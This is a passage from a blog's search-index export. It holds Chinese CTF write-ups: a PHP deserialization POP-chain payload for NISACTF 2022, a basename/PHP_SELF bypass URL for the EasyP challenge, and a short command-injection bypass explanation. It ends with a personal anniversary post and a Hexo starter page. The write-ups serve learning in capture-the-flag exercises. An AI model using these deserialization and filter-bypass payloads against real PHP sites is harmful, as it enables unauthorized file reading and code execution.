class="hljs-string">&#x27;O:4:&quot;fake&quot;:2:&#123;s:7:&quot;neutron&quot;;i:1;s:4:&quot;nova&quot;;R:2;&#125;&#x27;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//记得url编码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在得到的页面检查源代码发现flag在另一个文件夹里<br>继续改变参数读取就行</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【NISACTF 2022】popchains</title>
    <link href="/2024/07/26/%5BNISACTF%202022%5Dpopchains/"/>
    <url>/2024/07/26/%5BNISACTF%202022%5Dpopchains/</url>
    
    <content type="html"><![CDATA[<p>进来就是源码直接奉上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Happy New Year~ MAKE A WISH<br>  <span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>  @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>      <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>  <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span><br></code></pre></td></tr></table></figure><p>审计代码<br>发现只有include能利用来进行文件包含读取flag所以用include作为结尾开始构造poc<br>先来介绍几个用得到的魔术方法<br>__toString， 类被当成字符串时的回应方法<br>__wakeup()，执行unserialize()时，先会调用这个函数<br>__invoke()，调用函数的方式调用一个对象时的回应方法<br>__get()，调用一个不存在的成员变量触发<br><br>想要调用append函数只能通过触发invoke方法来调用<br>调用invoke则需要触发get方法<br>get方法需要通过触发toString来触发<br>toString方法就只能通过本类里面的wakeup方法来进行触发</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyP</title>
    <link href="/2024/07/15/EasyP/"/>
    <url>/2024/07/15/EasyP/</url>
    
    <content type="html"><![CDATA[<p><strong>先上源码</strong>   题目是这个[鹤城杯2021]EasyP<br><br><img src="/2024/07/15/EasyP/1.png"><br>进来就看到一个post传参传guess我傻傻的看了半天不知道secret是啥，后来才知道是迷惑我的<br>然后就开始考虑正则了，先解释三个函数<br><br><code>$_SERVER[&#39;PHP_SELF&#39;]</code><br>这个是指代调用脚本的路径<br>比如说这个题目它的值就是&#x2F;index.php<br>如果你访问的是<br><a href="http://127.0.0.1/index.php/utils.php">http://127.0.0.1/index.php/utils.php</a><br>那么它的值就会是&#x2F;index.php&#x2F;utils.php<br><br><code>$_SERVER[&#39;REQUEST_URI&#39;]</code><br>这个跟上面那个函数的区别就是会把后面的参数内容也包含进去<br><br><code>basename</code><br><img src="/2024/07/15/EasyP/2.png"><br>接下来就是要绕过正则了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则的意思是检查调用脚本的路径末尾是不是utils.php，比如你的脚本<br>路径是aaa/bbbb那么路径末尾就是最后一个/后面的东西<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则就需要用到php的特性了  [  (空格)  + 　.<br>上面那几个字符任何一个都行，都可以被处理成_<br></code></pre></td></tr></table></figure><p>最后是关于basename的绕过了，这个函数有个特点<br>如果传入的参数中出现了非ascii字符则会把它给丢弃，中文就不是ascii字符</p><p>那么直接上payload<br><a href="http://node4.anna.nssctf.cn:28192/index.php/utils.php/%E5%85%83%E7%A5%9E%E8%BF%98%E6%98%AF%E5%8E%9F%E7%A5%9E?show.source=1">http://node4.anna.nssctf.cn:28192/index.php/utils.php/元神还是原神?show.source=1</a></p><p>还有一个为什么要加一个index.php的问题<br>peekaboo大佬的wp里面：<br>为什么前面需要添加一个&#x2F;index.php呢<br>因为当我们传入index.php&#x2F;utils.php时，仍然请求的是index.php，<br>但是当basename()处理后，highlight_file()得到的参数就变成了utils.php，从而我们就实现了任意文件包含</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【2024XTCTF】牢牢记住，逝者为大</title>
    <link href="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/"/>
    <url>/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/</url>
    
    <content type="html"><![CDATA[<p>题目源码是这样的（这里借鉴的是官方的wp，因为我没写出来wwwww）<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/1.png"><br>这里有几个限制<br>1.注释<br>2.后面的脏数据<br>3.传入cmd的长度要在13个字符以内<br>4.限制命令执行的字符</p><p>首先我们先过注释符<br>只要加一个换行符就能绕过了，%0a<br>然后是脏数据，加个 ; 和注释 # 即可绕过，注意传注释符的时候要url编一下码就是 ;%23<br>我们限制已经消耗掉了三个字符，还有9个字符可用，9个字符，常规的方法是很难构造了，但是<br>我们有个反引号<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/2.png"><br>php里的反引号调用的是方法 shell_exec() ，用于执行系统命令，那么我们就可以直接在里面<br>执行命令了…吗？<br>虽然可以执行执行命令比如我们(‘.’是当前目录)<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/3.png"></p><p>不多不少刚刚好9个字符能把根目录里的东西复制过来，然后直接访问静态资源flag就能直接读取 了，但是非常可惜，会触发”肘死你”或者”what can i say”，就没有办法拯救牢大了 那么我们换一种思路，我们用另一个变量往里面传参，那么就能不受长度的限制自由构造了 <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/4.png"></p><p>我们只要往1传参就能传到里面去，就能自由执行命令了，但是要注意的是，这种方法是无回显 的，无回显也问题不大，用上面的方法把flag复制一下然后直接访问就行，或者直接弹shell <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/5.png"></p><p>用 ‘’ 来绕过过滤的 cp ，但是我们可以看到通配符是给过滤了的，我们就可以引出第二个技巧， [a-z] ，linux里用中括号可以根据ascii码来匹配里面的字符集， [a-z] 就是匹配任何小写字母a 到z中的一个字符，那么我们就能简单的构造出想要的字符了 payload: <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我最爱的宝贝</title>
    <link href="/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/"/>
    <url>/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>在一起的纪念日是2022.11.09<br>哇侬的生日是2005.02.09<img src="/2024/07/14/%E6%88%91%E6%9C%80%E7%88%B1%E7%9A%84%E5%AE%9D%E8%B4%9D/baby.png" alt="宝贝生日"></p>]]></content>
    
    
    <categories>
      
      <category>生活的美</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哇侬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/07/13/hello-world/"/>
    <url>/2024/07/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
